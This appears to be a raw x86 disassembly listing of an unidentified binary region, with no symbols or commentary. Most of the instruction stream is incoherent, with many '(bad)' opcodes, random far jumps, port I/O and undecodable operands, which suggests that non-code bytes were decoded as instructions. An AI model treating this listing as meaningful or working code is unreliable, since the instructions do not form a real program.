  4061b1:	test   DWORD PTR [esi+ebx*1-0x472f1eba],edx
  4061b8:	aaa    
  4061b9:	xlat   BYTE PTR ds:[ebx]
  4061ba:	xchg   esp,eax
  4061bb:	mov    esp,0xe2d8fcff
  4061c0:	aas    
  4061c1:	or     al,BYTE PTR [edx-0x5b66bae1]
  4061c7:	push   edi
  4061c8:	aad    0x82
  4061ca:	pop    ecx
  4061cb:	cmp    al,0x40
  4061cd:	pop    ss
  4061ce:	mov    WORD PTR [ebx-0xc],?
  4061d1:	xor    BYTE PTR [eax],cl
  4061d3:	call   0xb51c8212
  4061d8:	xor    ecx,DWORD PTR [esi]
  4061da:	std    
  4061db:	leave  
  4061dc:	fisub  DWORD PTR [edi]
  4061de:	pop    ds
  4061df:	cmp    ah,BYTE PTR [esi-0x3e]
  4061e2:	mov    ecx,0x7e360de7
  4061e7:	mov    ds:0xbfc7b32,eax
  4061ec:	mov    cl,0x8f
  4061ee:	hlt    
  4061ef:	(bad)  
  4061f0:	push   0xf9b4b051
  4061f5:	push   edi
  4061f6:	popa   
  4061f7:	popa   
  4061f8:	xchg   ecx,eax
  4061f9:	jp     0x4061ac
  4061fb:	mov    esi,0xe210f8a3
  406200:	retf   0x81a2
  406203:	and    eax,0x4b546dbe
  406208:	push   ebx
  406209:	in     al,dx
  40620a:	jp     0x4061ff
  40620c:	jmp    0x995c:0xc0d49831
  406213:	in     eax,dx
  406214:	xor    BYTE PTR [eax+ebx*8+0x46],al
  406218:	shl    dh,cl
  40621a:	jae    0x406264
  40621c:	push   ss
  40621d:	mov    bh,0xcd
  40621f:	out    dx,al
  406220:	fsub   DWORD PTR [ecx+0x32b48a1f]
  406226:	out    dx,eax
  406227:	cmp    eax,ecx
  406229:	mov    BYTE PTR [ecx+0xd],ah
  40622c:	pushf  
  40622d:	mov    al,ds:0xbbfec18a
  406232:	jo     0x4062a3
  406234:	and    eax,0xe2d7d82c
  406239:	jle    0x40627d
  40623b:	xor    DWORD PTR [edi-0x38],ebp
  40623e:	mov    ebp,0x545ad97a
  406243:	ret    0x29e1
  406246:	jl     0x4061cd
  406248:	fisttp DWORD PTR [esi+0x14a13a70]
  40624e:	leave  
  40624f:	inc    edx
  406250:	clc    
  406251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406252:	(bad)  
  406253:	data16 xor BYTE PTR [ebx+0x3c],bl
  406257:	in     eax,dx
  406258:	or     esp,DWORD PTR [edi+edx*2]
  40625b:	ror    ebx,0x59
  40625e:	(bad)  [edx+edi*8]
  406261:	jmp    0xfc12:0x75ea0dcc
  406268:	ins    BYTE PTR es:[edi],dx
  406269:	call   0x3b950ebd
  40626e:	ja     0x406217
  406270:	fadd   QWORD PTR [ebp-0x42ed4774]
  406276:	dec    esp
  406277:	push   ds
  406278:	pop    esi
  406279:	xlat   BYTE PTR ds:[ebx]
  40627a:	(bad)  
  40627b:	dec    ebp
  40627c:	aam    0x9e
  40627e:	sbb    eax,0x9014eb52
  406283:	jns    0x40623a
  406285:	adc    al,0x8
  406287:	nop
  406288:	pop    ss
  406289:	jnp    0x4062be
  40628b:	sar    DWORD PTR [ecx],0x78
  40628e:	les    edi,FWORD PTR [edx]
  406290:	mov    edx,0xb6ae35a0
  406295:	mov    ss,WORD PTR [edx+0x7e]
  406298:	inc    edx
  406299:	push   edi
  40629a:	xchg   edx,ecx
  40629c:	xor    BYTE PTR [edx],ah
  40629e:	daa    
  40629f:	pop    ebp
  4062a0:	arpl   WORD PTR [eax+ecx*1-0x38],ax
  4062a4:	outs   dx,BYTE PTR ds:[esi]
  4062a5:	mov    al,ds:0x83b3c821
  4062aa:	hlt    
  4062ab:	ins    BYTE PTR es:[edi],dx
  4062ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ad:	adc    BYTE PTR ds:0xd66127aa,0xd6
  4062b4:	cwde   
  4062b5:	push   ebp
  4062b6:	jp     0x40628c
  4062b8:	and    al,bl
  4062ba:	dec    eax
  4062bb:	pop    edx
  4062bc:	fscale 
  4062be:	jb     0x4062ec
  4062c0:	pop    esi
  4062c1:	pop    esi
  4062c2:	and    al,0x41
  4062c4:	xchg   edx,eax
  4062c5:	test   al,0xe6
  4062c7:	push   0xffffff9c
  4062c9:	aaa    
  4062ca:	cmp    bh,bl
  4062cc:	daa    
  4062cd:	xor    BYTE PTR [esi+ebx*4],0x35
  4062d1:	rcl    edx,cl
  4062d3:	cs scas al,BYTE PTR es:[edi]
  4062d5:	or     DWORD PTR [edx],ebp
  4062d7:	ins    BYTE PTR es:[edi],dx
  4062d8:	(bad)  
  4062d9:	sti    
  4062da:	neg    dl
  4062dc:	pop    ecx
  4062dd:	jbe    0x4062de
  4062df:	int3   
  4062e0:	add    ecx,DWORD PTR [eax-0x28bdee2c]
  4062e6:	or     bh,BYTE PTR [edx+0x6e823efb]
  4062ec:	fbld   TBYTE PTR cs:[esi+0x5a]
  4062f0:	sbb    BYTE PTR [edx+eax*2+0x603dc12b],0x6e
  4062f8:	push   eax
  4062f9:	jae    0x40635c
  4062fb:	ins    BYTE PTR es:[edi],dx
  4062fc:	les    edx,FWORD PTR [edx-0x75]
  4062ff:	ss popa 
  406301:	sbb    bl,dh
  406303:	push   ebx
  406304:	les    esi,FWORD PTR [esp+edi*8+0x29]
  406308:	in     eax,dx
  406309:	inc    edx
  40630a:	sbb    eax,0x3abc51fa
  40630f:	push   ds
  406310:	vsqrtsd xmm2,xmm2,QWORD PTR [edx+0xd]
  406315:	pop    esp
  406316:	push   esi
  406317:	mov    ebx,0x7cfdbd0c
  40631c:	mov    ebp,0x3f9424b9
  406321:	scas   al,BYTE PTR es:[edi]
  406322:	push   edi
  406323:	das    
  406324:	fdiv   st(2),st
  406326:	sbb    BYTE PTR [edi+0x5654c78],bh
  40632c:	pop    edi
  40632d:	sub    dh,bh
  40632f:	sar    DWORD PTR [esi+0x6e],0xbd
  406333:	cmp    al,0xe
  406335:	cld    
  406336:	(bad)  
  406337:	retf   0x49d7
  40633a:	ins    DWORD PTR es:[edi],dx
  40633b:	daa    
  40633c:	sub    dh,dh
  40633e:	icebp  
  40633f:	or     edx,esp
  406341:	cmc    
  406342:	pop    edx
  406343:	mov    ss,WORD PTR [edi]
  406345:	cwde   
  406346:	retf   
  406347:	push   eax
  406348:	mov    ch,0x42
  40634a:	aas    
  40634b:	pcmpeqd mm5,QWORD PTR [edi+ebx*4]
  40634f:	(bad)  
  406350:	cmc    
  406351:	lock and ebx,DWORD PTR [esp+eax*4-0x57]
  406356:	push   edx
  406357:	scas   eax,DWORD PTR es:[edi]
  406358:	aam    0xf5
  40635a:	in     al,dx
  40635b:	xor    bl,ch
  40635d:	xor    al,0x72
  40635f:	ja     0x40637f
  406361:	daa    
  406362:	mov    cl,0x9
  406364:	inc    ecx
  406365:	mov    edx,0x42382f77
  40636a:	lods   al,BYTE PTR ds:[esi]
  40636b:	push   ds
  40636c:	cld    
  40636d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40636f:	mov    edx,0xf38350f4
  406374:	sbb    BYTE PTR [ebp+0x6a],bh
  406377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406378:	and    BYTE PTR [edx],0xcc
  40637b:	addr16 push eax
  40637d:	pusha  
  40637e:	enter  0xbd22,0x3c
  406382:	mov    esi,gs
  406384:	out    0x58,al
  406386:	xor    BYTE PTR [esi+0x72df53b9],dh
  40638c:	jecxz  0x4063c8
  40638e:	push   esi
  40638f:	mov    cl,0xf7
  406391:	jecxz  0x406379
  406393:	mov    DWORD PTR [edi],edx
  406395:	or     eax,0x7055fc38
  40639a:	xor    DWORD PTR [ecx-0x65],eax
  40639d:	cmp    bh,al
  40639f:	push   ebp
  4063a0:	aam    0xf4
  4063a2:	(bad)
  4063a5:	add    eax,0xdbf7fb1e
  4063aa:	push   ecx
  4063ab:	add    al,0xbf
  4063ad:	fwait
  4063ae:	cs xor eax,0x4139d1f3
  4063b4:	xchg   esi,eax
  4063b5:	aaa    
  4063b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b7:	ja     0x40633b
  4063b9:	popa   
  4063ba:	jge    0x4063f7
  4063bc:	mov    al,ds:0x43fedb1a
  4063c1:	mov    al,0xa
  4063c3:	rol    DWORD PTR [ebp-0x26],0x41
  4063c7:	in     al,0x98
  4063c9:	xor    BYTE PTR [ecx+0x5bb079de],0x4b
  4063d0:	pop    esi
  4063d1:	and    DWORD PTR [ebp-0x4b],edx
  4063d4:	clc    
  4063d5:	mov    cl,0x74
  4063d7:	sbb    ah,BYTE PTR [ebx-0x9]
  4063da:	jae    0x406449
  4063dc:	dec    edi
  4063dd:	fwait
  4063de:	cmp    BYTE PTR [edx+eax*4],bl
  4063e1:	jl     0x4063ce
  4063e3:	mov    eax,ds:0xdd450b32
  4063e8:	xor    al,0xaa
  4063ea:	mov    edx,0x6bb05b1
  4063ef:	jg     0x40641f
  4063f1:	jmp    0xe33:0x86ff556
  4063f8:	mov    ecx,0x88709eb4
  4063fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063fe:	xor    eax,0xb917aa2a
  406403:	rol    ebx,1
  406405:	repnz mov eax,ds:0x9b81c2b6
  40640b:	jb     0x406434
  40640d:	add    cl,0x18
  406410:	push   ebx
  406411:	jae    0x4063a5
  406413:	mov    cl,0xa2
  406415:	aas    
  406416:	push   cs
  406417:	mov    edx,0xd5170bad
  40641c:	les    edx,FWORD PTR [edx]
  40641e:	scas   al,BYTE PTR es:[edi]
  40641f:	and    BYTE PTR [ebp+0x5780435],bh
  406425:	sar    al,1
  406427:	sbb    eax,0xe3894030
  40642c:	pop    edx
  40642d:	jmp    0xcbc1:0x97f5b6fb
  406434:	inc    ecx
  406435:	shr    BYTE PTR [eax+0x73],1
  406438:	popa   
  406439:	(bad)  
  40643a:	out    dx,al
  40643b:	bound  edi,QWORD PTR [eax*1+0x1144dff8]
  406442:	mov    cl,0xad
  406444:	arpl   si,si
  406446:	cmp    al,0xaa
  406448:	call   0x8565898a
  40644d:	js     0x4063e6
  40644f:	or     DWORD PTR [eax-0x28],0x551428aa
  406456:	or     dh,BYTE PTR [ecx-0x5ecfc0f3]
  40645c:	test   eax,0x96fba25
  406461:	aad    0x8e
  406463:	(bad)  
  406464:	(bad)  
  406465:	xor    ebx,DWORD PTR [esi+0x69]
  406468:	sahf   
  406469:	mov    dl,0xa9
  40646b:	adc    dh,bh
  40646d:	fucom  st(0)
  40646f:	adc    ah,bl
  406471:	es fwait
  406473:	mov    ds:0x2c8a086e,al
  406478:	(bad)  
  406479:	xor    eax,0x75bb0630
  40647e:	cmp    eax,0xacd9736c
  406483:	adc    eax,DWORD PTR [edi+ecx*1+0x13]
  406487:	mov    ds:0x52d92d7a,al
  40648c:	aas    
  40648d:	sub    DWORD PTR [edx-0x15],0xffffffbe
  406491:	loop   0x406452
  406493:	xor    eax,0x92ccb2e5
  406498:	call   0x4b26:0xbdcddbe8
  40649f:	pop    ebp
  4064a0:	inc    ecx
  4064a1:	das    
  4064a2:	mov    ebp,0x8cf098e1
  4064a7:	mov    al,0x5e
  4064a9:	sub    DWORD PTR [ebp-0xe],edi
  4064ac:	sub    esp,ecx
  4064ae:	scas   al,BYTE PTR es:[edi]
  4064af:	cmp    BYTE PTR [ecx+0x40],0x6b
  4064b3:	rcl    DWORD PTR [ebp+0x4],cl
  4064b6:	ret    
  4064b7:	mov    esp,DWORD PTR [edx-0x47a061e3]
  4064bd:	dec    edi
  4064be:	jl     0x4064fc
  4064c0:	and    ebx,DWORD PTR [eax+0x1a]
  4064c3:	push   ebp
  4064c4:	fwait
  4064c5:	push   ds
  4064c6:	les    esp,FWORD PTR [ebx-0x5e]
  4064c9:	int3   
  4064ca:	ror    BYTE PTR [ecx-0x64b6d7af],cl
  4064d0:	aad    0xb4
  4064d2:	cmp    DWORD PTR [edx+0x59518ef9],esp
  4064d8:	jne    0x40654c
  4064da:	add    DWORD PTR [ecx-0x31628758],edi
  4064e0:	mov    al,ds:0x34ae3a77
  4064e5:	std    
  4064e6:	pop    eax
  4064e7:	and    DWORD PTR [ebx],edx
  4064e9:	adc    BYTE PTR [ecx-0x3df2fb41],dl
  4064ef:	icebp  
  4064f0:	stc    
  4064f1:	sahf   
  4064f2:	test   eax,0x46a5a8b8
  4064f7:	ss mov ch,0x75
  4064fa:	outs   dx,BYTE PTR ds:[esi]
  4064fb:	loope  0x4064ff
  4064fd:	inc    edx
  4064fe:	dec    edx
  4064ff:	xor    dh,BYTE PTR [ecx-0x38]
  406502:	inc    ecx
  406503:	push   esi
  406504:	std    
  406505:	out    0x2f,eax
  406507:	enter  0x6982,0x50
  40650b:	or     bl,ch
  40650d:	imul   esp,DWORD PTR [esi],0xc5194b11
  406513:	out    dx,al
  406514:	jns    0x406593
  406516:	icebp  
  406517:	adc    BYTE PTR [edi+edx*4+0xb],cl
  40651b:	sub    BYTE PTR [edi+ebx*8+0x4fd2039c],bh
  406522:	adc    BYTE PTR [ebp+0x6fa8fe58],dh
  406528:	lods   al,BYTE PTR ds:[esi]
  406529:	adc    eax,edx
  40652b:	ds scas al,BYTE PTR es:[edi]
  40652d:	mov    dl,al
  40652f:	dec    esp
  406530:	fwait
  406531:	or     BYTE PTR [eax+0x40d30774],0x88
  406538:	dec    edi
  406539:	mov    esp,0x1f9b1bdc
  40653e:	xchg   ebp,eax
  40653f:	jbe    0x4064fb
  406541:	or     BYTE PTR [eax+ebp*1+0x6e],al
  406545:	sar    DWORD PTR [esi],cl
  406547:	xor    BYTE PTR [ebp+0x2db5092d],al
  40654d:	sahf   
  40654e:	and    BYTE PTR [edi],bh
  406550:	inc    esi
  406551:	cmp    al,0x29
  406553:	out    0x6a,al
  406555:	adc    ecx,DWORD PTR [ebx-0x1ad9508d]
  40655b:	dec    esi
  40655c:	popf   
  40655d:	and    esi,ecx
  40655f:	aas    
  406560:	in     eax,dx
  406561:	shl    BYTE PTR [eax],cl
  406563:	lods   eax,DWORD PTR ds:[esi]
  406564:	inc    eax
  406565:	push   es
  406566:	pusha  
  406567:	inc    edi
  406568:	pop    ss
  406569:	mov    ch,0x1a
  40656b:	push   ss
  40656c:	mov    ecx,DWORD PTR [eax-0x8d8647d]
  406572:	inc    esi
  406573:	imul   edx,DWORD PTR [edi-0x29c565b6],0x5ab4639
  40657d:	xchg   edi,ebp
  40657f:	call   0x836d3747
  406584:	gs test al,0xbc
  406587:	add    al,0xed
  406589:	push   ecx
  40658a:	xor    BYTE PTR [eax+ecx*1+0x364c41],0x26
  406592:	test   BYTE PTR [esi+0x5f6e653d],bl
  406598:	shr    DWORD PTR [esi+0x55],0xa0
  40659c:	aaa    
  40659d:	es xchg esp,eax
  40659f:	or     eax,0xe76214c6
  4065a4:	sbb    al,0xf1
  4065a6:	xchg   edx,eax
  4065a7:	sbb    dl,ch
  4065a9:	test   al,0xd6
  4065ab:	sbb    bh,cl
  4065ad:	jle    0x406557
  4065af:	mov    ebp,0xfa3554fe
  4065b4:	pop    ss
  4065b5:	shr    ecx,cl
  4065b7:	sub    eax,0x76195fba
  4065bc:	inc    ebp
  4065bd:	mov    bl,0xb9
  4065bf:	call   0xb88:0xbde46d3
  4065c6:	lock mov al,ds:0x2ceb5d27
  4065cc:	in     eax,dx
  4065cd:	sbb    BYTE PTR [ebx-0x5a78bf71],bh
  4065d3:	test   DWORD PTR [edi+0x66f13281],eax
  4065d9:	mov    DWORD PTR [edx+edx*1+0x1d],0xce5bd2a2
  4065e1:	(bad)  
  4065e2:	int3   
  4065e3:	add    al,0x50
  4065e5:	mov    esp,0x2228814d
  4065ea:	pop    ebp
  4065eb:	pop    ecx
  4065ec:	dec    ebx
  4065ed:	test   BYTE PTR [edi+0x1d],bl
  4065f0:	aad    0x4d
  4065f2:	mov    ebp,0x868a543f
  4065f7:	enter  0x6aec,0xcf
  4065fb:	arpl   WORD PTR [ecx],di
  4065fd:	enter  0x8210,0xf1
  406601:	mov    esp,0x908f6913
  406606:	es pop edx
  406608:	push   ebp
  406609:	(bad)  
  40660a:	out    0x71,eax
  40660c:	jbe    0x4065d1
  40660e:	outs   dx,BYTE PTR ds:[esi]
  40660f:	in     al,0x40
  406611:	mov    esi,0x61cdb5b0
  406616:	mov    BYTE PTR [ebx-0x5f171067],0x9d
  40661d:	ja     0x406604
  40661f:	or     al,0x48
  406621:	or     al,0xda
  406623:	out    0x3c,al
  406625:	rcl    esi,cl
  406627:	mov    ds:0x142d245e,eax
  40662c:	cmp    DWORD PTR [ebx+ecx*1+0x7e],esi
  406630:	jbe    0x406696
  406632:	pop    eax
  406633:	mov    ?,WORD PTR [ebx-0x6f36de04]
  406639:	sub    ah,dh
  40663b:	idiv   BYTE PTR [esp]
  40663e:	add    ebx,DWORD PTR [eax]
  406640:	sbb    DWORD PTR [esi+ebp*4+0x30a80ac4],eax
  406647:	mov    ebp,ebx
  406649:	ja     0x40669d
  40664b:	mov    ah,0x5
  40664d:	(bad)  
  40664e:	call   0xc0b88e69
  406653:	mov    WORD PTR [ebp+0x6a],ss
  406656:	mov    esp,0xb56a5132
  40665b:	push   0xa566d31f
  406660:	adc    BYTE PTR [esi-0x51],bl
  406663:	xchg   esi,eax
  406664:	sbb    dl,al
  406666:	mov    ebp,0xff0c2b
  40666b:	jne    0x4066bc
  40666d:	inc    DWORD PTR [eax-0x4c60d310]
  406673:	fstp   QWORD PTR gs:[edx]
  406676:	not    BYTE PTR [eax-0x44]
  406679:	inc    eax
  40667a:	mov    edi,0x616457ec
  40667f:	test   ecx,edx
  406681:	aaa    
  406682:	cli    
  406683:	mov    edi,fs
  406685:	int    0xb5
  406687:	mov    dl,0x7
  406689:	inc    eax
  40668a:	pop    ebx
  40668b:	int3   
  40668c:	push   es
  40668d:	dec    edi
  40668e:	cmp    edi,DWORD PTR [edi-0x72a37984]
  406694:	test   ebx,ecx
  406696:	adc    al,0x87
  406698:	pusha  
  406699:	(bad)  
  40669b:	mov    edx,0x46cb33c2
  4066a0:	push   esi
  4066a1:	mov    eax,0x2800a178
  4066a6:	xor    DWORD PTR [eax-0x1d],edx
  4066a9:	push   ecx
  4066aa:	xor    eax,0xabd968f3
  4066af:	mov    eax,ebp
  4066b1:	lods   eax,DWORD PTR ds:[esi]
  4066b2:	aad    0x69
  4066b4:	sub    BYTE PTR [eax+0x2a04395],ah
  4066ba:	sbb    al,0x12
  4066bc:	(bad)  
  4066bd:	and    BYTE PTR [ebx-0xe570cd],0xff
  4066c4:	stos   BYTE PTR es:[edi],al
  4066c5:	sti    
  4066c6:	and    BYTE PTR [ebp-0x29dd47cd],ch
  4066cc:	mov    WORD PTR [edx-0x6532fb61],?
  4066d2:	cs xchg edx,eax
  4066d4:	pop    eax
  4066d5:	ins    DWORD PTR es:[edi],dx
  4066d6:	add    DWORD PTR [esi-0x48],ebx
  4066d9:	mov    al,ds:0xa0c92cff
  4066de:	rol    BYTE PTR [ebx-0x52e91a8f],cl
  4066e4:	in     eax,dx
  4066e5:	ds in  al,dx
  4066e7:	sbb    al,0x81
  4066e9:	fst    QWORD PTR [edi]
  4066eb:	cld    
  4066ec:	retf   0x9acc
  4066ef:	sub    dh,BYTE PTR [edx+esi*1]
  4066f2:	xlat   BYTE PTR ds:[ebx]
  4066f3:	outs   dx,BYTE PTR ds:[esi]
  4066f4:	js     0x40673a
  4066f6:	out    0xdc,al
  4066f8:	mov    bl,0x46
  4066fa:	mov    edx,0x35657d9d
  4066ff:	mov    cl,0xc8
  406701:	mov    esi,0x416dcf2f
  406706:	iret   
  406707:	retf   
  406708:	js     0x4066fd
  40670a:	ins    DWORD PTR es:[edi],dx
  40670b:	push   ss
  40670c:	in     al,0x79
  40670e:	shr    DWORD PTR [eax-0x6],1
  406711:	pop    ds
  406712:	jmp    FWORD PTR [ebx*4-0x290da0de]
  406719:	sbb    ecx,DWORD PTR [edi]
  40671b:	xchg   esp,eax
  40671c:	sub    bh,bh
  40671e:	jecxz  0x406789
  406720:	mov    edi,0x2225159b
  406725:	verr   WORD PTR [edi+0x2]
  406729:	adc    BYTE PTR [eax-0x44dc145f],ch
  40672f:	call   0x8d2de31f
  406734:	pop    ds
  406735:	test   DWORD PTR [ebp+esi*4-0x1f],esp
  406739:	pop    ebp
  40673a:	sub    eax,0xd5cab62e
  40673f:	scas   al,BYTE PTR es:[di]
  406741:	cld    
  406742:	jge    0x406769
  406744:	or     cl,BYTE PTR [ebx+0x809c2c2]
  40674a:	inc    esi
  40674b:	sub    BYTE PTR [esi],dh
  40674d:	je     0x40677c
  40674f:	inc    esi
  406750:	arpl   WORD PTR [esp+eax*8-0x27e15964],bp
  406757:	push   0x25485ee9
  40675c:	pusha  
  40675d:	or     BYTE PTR [ebx+0xdbda318],cl
  406763:	cdq    
  406764:	push   esp
  406765:	dec    edx
  406766:	and    DWORD PTR [edx+ebx*4+0x2bdc58a1],edi
  40676d:	mov    ds:0xc6b8eb42,eax
  406772:	sbb    DWORD PTR [ebp+0x2d],0xbc4e1dbc
  406779:	mov    edi,0x5085a358
  40677e:	push   es
  40677f:	add    ecx,DWORD PTR [eax+0x2c]
  406782:	lods   eax,DWORD PTR ds:[esi]
  406783:	add    BYTE PTR es:[ecx-0x4e],0x1f
  406788:	iret   
  406789:	sbb    al,0x97
  40678c:	and    bh,BYTE PTR [edx+eax*2]
  40678f:	repnz sub BYTE PTR [ebp+0x39],al
  406793:	adc    eax,0xd327941a
  406798:	or     BYTE PTR [eax-0x329ebaf5],dl
  40679e:	or     BYTE PTR [edi],al
  4067a0:	dec    ebx
  4067a1:	retf   
  4067a2:	jecxz  0x40678f
  4067a4:	pop    ebp
  4067a5:	lods   al,BYTE PTR ds:[esi]
  4067a6:	scas   al,BYTE PTR es:[edi]
  4067a7:	jbe    0x4067ff
  4067a9:	cwde   
  4067aa:	aas    
  4067ab:	sbb    ch,al
  4067ad:	arpl   WORD PTR [ebx-0x6b20cf4e],ax
  4067b3:	aad    0x63
  4067b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b6:	pop    esi
  4067b7:	out    dx,eax
  4067b8:	and    eax,0x3219827c
  4067bd:	adc    esi,DWORD PTR [ecx+0x27]
  4067c0:	fsub   QWORD PTR [edx]
  4067c2:	jb     0x4067b6
  4067c4:	es cdq 
  4067c6:	push   es
  4067c7:	mov    bl,BYTE PTR [eax-0x3c1aee33]
  4067cd:	iret   
  4067ce:	int    0x9e
  4067d0:	jnp    0x406813
  4067d2:	mov    ds:0x4a10a963,eax
  4067d7:	popf   
  4067d8:	xor    al,0x29
  4067da:	pop    ds
  4067db:	adc    esi,DWORD PTR [ecx+0x2f6599e2]
  4067e1:	mov    DWORD PTR [ebp-0x160b3388],edx
  4067e7:	add    eax,0x3d68e8b3
  4067ec:	xchg   ecx,eax
  4067ed:	add    ebx,DWORD PTR [edx]
  4067ef:	sub    DWORD PTR [esi-0x76ab55b2],eax
  4067f5:	add    cl,BYTE PTR [edi-0x16]
  4067f8:	push   esp
  4067f9:	test   DWORD PTR [edx-0x45],esp
  4067fc:	cmp    eax,0xd173c81b
  406801:	fdivr  st(4),st
  406803:	add    eax,0x244b9fc3
  406808:	(bad)  
  406809:	inc    esi
  40680a:	test   al,0x83
  40680c:	pop    eax
  40680d:	sub    esp,DWORD PTR [ebx+0x3a512850]
  406813:	or     esp,DWORD PTR [ecx]
  406815:	in     al,dx
  406816:	fimul  DWORD PTR [esi]
  406818:	mov    al,BYTE PTR [esi]
  40681a:	add    BYTE PTR [ebx+0x28b03a37],dh
  406820:	lahf   
  406821:	mov    ah,0x7f
  406823:	cli    
  406824:	mov    fs,esi
  406826:	sub    al,0x35
  406828:	add    al,ch
  40682a:	xlat   BYTE PTR ds:[ebx]
  40682b:	sub    edi,esi
  40682d:	cwde   
  40682e:	sahf   
  40682f:	add    BYTE PTR [esi],dl
  406831:	inc    edi
  406832:	cld    
  406833:	push   edx
  406834:	add    DWORD PTR [ecx+0x43],ebp
  406837:	(bad)  
  406838:	outs   dx,BYTE PTR ds:[esi]
  406839:	lea    edx,[ecx-0x6771e430]
  40683f:	push   0xffffff83
  406841:	add    eax,0x55d66a9a
  406846:	adc    eax,0x770c5ce2
  40684b:	sub    eax,0x7bfb1eec
  406850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406851:	xor    ah,ah
  406853:	jmp    0xa510:0xfb96a0f9
  40685a:	sbb    DWORD PTR [ebx],edi
  40685c:	pop    eax
  40685d:	mov    eax,0x4701ad5a
  406862:	repnz mov ecx,0xe8f21097
  406868:	js     0x4068cd
  40686a:	sbb    eax,0x2693b41e
  40686f:	sahf   
  406870:	cmp    edi,DWORD PTR [eax+0x6d]
  406873:	jo     0x406883
  406875:	add    BYTE PTR [edi+0x6ab5e4c9],ah
  40687b:	or     DWORD PTR ds:0x6c7acd30,esp
  406881:	mov    al,ds:0x1e4f49c2
  406886:	ficomp DWORD PTR [eax+0x48afbe40]
  40688c:	test   esp,0x9aa9693a
  406892:	jbe    0x406879
  406894:	jmp    0x85ba1198
  406899:	push   edi
  40689a:	inc    edi
  40689b:	scas   eax,DWORD PTR es:[di]
  40689d:	mov    al,0x8c
  40689f:	dec    edi
  4068a0:	in     al,0x34
  4068a2:	adc    dh,bl
  4068a4:	in     al,dx
  4068a5:	mov    edi,0x6f9cab57
  4068aa:	out    dx,eax
  4068ab:	test   eax,0x5e082a9d
  4068b0:	and    al,0xa1
  4068b2:	mov    dl,ah
  4068b4:	dec    edx
  4068b5:	pop    edi
  4068b6:	push   edx
  4068b7:	fidiv  DWORD PTR ds:0xfa7bcd46
  4068bd:	inc    esi
  4068be:	mov    ebx,0x513f91f9
  4068c3:	test   al,0xc0
  4068c5:	xchg   ebp,eax
  4068c6:	fcom   QWORD PTR [edx]
  4068c8:	xchg   ebp,eax
  4068c9:	xchg   esi,eax
  4068ca:	test   eax,ebp
  4068cc:	mov    ds:0xeaeed7bf,eax
  4068d1:	or     BYTE PTR [eax-0x2b396018],bl
  4068d7:	stc    
  4068d8:	or     edx,DWORD PTR [ebx]
  4068da:	sub    BYTE PTR [edi-0xedb2025],dh
  4068e0:	mov    bh,0x50
  4068e2:	mov    ds:0x94d4c505,al
  4068e7:	push   ebx
  4068e8:	in     eax,dx
  4068e9:	ja     0x406911
  4068eb:	xsaves [ebx-0x46]
  4068ef:	dec    eax
  4068f0:	ret    0x66fa
  4068f3:	xchg   esp,eax
  4068f4:	pop    edi
  4068f5:	sub    DWORD PTR [esi],esi
  4068f7:	dec    edx
  4068f8:	repnz icebp 
  4068fa:	or     al,0xe2
  4068fc:	daa    
  4068fd:	sub    eax,0x35dd1e6
  406902:	stos   DWORD PTR es:[edi],eax
  406903:	aad    0x3e
  406905:	jmp    0x1927:0x794d0e0c
  40690c:	dec    esp
  40690d:	(bad)  
  40690e:	(bad)  
  40690f:	out    dx,al
  406910:	in     eax,0xdb
  406912:	out    dx,eax
  406913:	push   edi
  406914:	dec    ecx
  406915:	repz vfmadd231ss xmm5{k3}{z},xmm5,(bad)
  406917:	rcl    BYTE PTR [ebp-0x45],cl
  40691a:	mov    ecx,0xfa6ab06d
  40691f:	imul   eax,DWORD PTR [edx+eiz*4+0x57],0xa602fc99
  406927:	jbe    0x406974
  406929:	ss call 0x6565:0xf7414797
  406931:	xchg   edx,eax
  406932:	fisub  DWORD PTR [edx+0x5bad5639]
  406938:	icebp  
  406939:	and    al,0x2f
  40693b:	fwait
  40693c:	jne    0x406957
  40693e:	fcomp  DWORD PTR [ebp+0x5]
  406941:	test   DWORD PTR [ecx-0x55],esp
  406944:	jge    0x40692c
  406946:	inc    ebx
  406947:	jmp    0x33220416
  40694c:	mov    dl,0xcd
  40694e:	jle    0x40697a
  406950:	(bad)  
  406951:	sub    dl,cl
  406953:	pop    ecx
  406954:	loope  0x4069ad
  406956:	stos   BYTE PTR es:[edi],al
  406957:	pushf  
  406958:	test   eax,0xc1cabff0
  40695d:	dec    esp
  40695e:	daa    
  40695f:	(bad)  
  406960:	popf   
  406961:	aam    0x26
  406963:	cld    
  406964:	cmc    
  406965:	stos   BYTE PTR es:[edi],al
  406966:	or     al,BYTE PTR [ebp+0x3b]
  406969:	or     al,0x14
  40696b:	sub    edi,DWORD PTR ds:0xa716ce46
  406971:	xchg   esp,eax
  406972:	jnp    0x406917
  406974:	ret    0xb40d
  406977:	shl    DWORD PTR [esi+edx*8-0x3f],cl
  40697b:	and    dl,BYTE PTR [ecx]
  40697d:	icebp  
  40697e:	dec    esi
  40697f:	mov    ss,ecx
  406981:	repnz scas eax,DWORD PTR es:[edi]
  406983:	mov    bl,0x4e
  406985:	mov    bh,0xa5
  406987:	pop    esi
  406988:	ins    DWORD PTR es:[edi],dx
  406989:	push   eax
  40698a:	test   eax,0x1d445f81
  40698f:	adc    edi,edx
  406991:	in     eax,0x29
  406993:	les    edi,FWORD PTR [ecx+esi*2+0x6d8542bf]
  40699a:	jo     0x4069b3
  40699c:	repz pusha 
  40699e:	pop    edx
  40699f:	mov    al,ds:0x98a4a488
  4069a4:	daa    
  4069a5:	int    0x2a
  4069a7:	in     eax,dx
  4069a8:	ror    DWORD PTR [edi+0x35],1
  4069ab:	enter  0x9d0a,0xc0
  4069af:	mov    ebp,0xf7ec87d0
  4069b4:	push   ecx
  4069b5:	sahf   
  4069b6:	out    dx,eax
  4069b7:	mov    ch,0x4a
  4069b9:	pop    esi
  4069ba:	(bad)  [ebx]
  4069bc:	xor    al,0x46
  4069be:	and    eax,0x423667e1
  4069c3:	sub    eax,0x87be1b9c
  4069c8:	xor    DWORD PTR [edi],0x54
  4069cb:	addr16 xchg ecx,eax
  4069cd:	inc    esi
  4069ce:	sahf   
  4069cf:	in     al,dx
